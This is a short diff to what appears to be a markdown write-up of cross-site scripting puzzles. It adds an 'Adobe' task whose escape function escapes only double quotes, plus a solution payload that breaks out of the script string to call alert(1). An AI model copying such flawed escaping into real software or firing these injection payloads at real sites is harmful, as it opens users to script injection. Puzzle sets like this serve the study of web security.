@@ -26,3 +26,21 @@ function escape(s) {
 ```
 ",alert(1),"
 ```
+
+
+### Adobe
+
+- Task
+
+```
+function escape(s) {
+  s = s.replace(/"/g, '\\"');
+  return '<script>console.log("' + s + '");</script>';
+}
+```
+
+- Solution
+
+```
+\");alert(1)//
+```
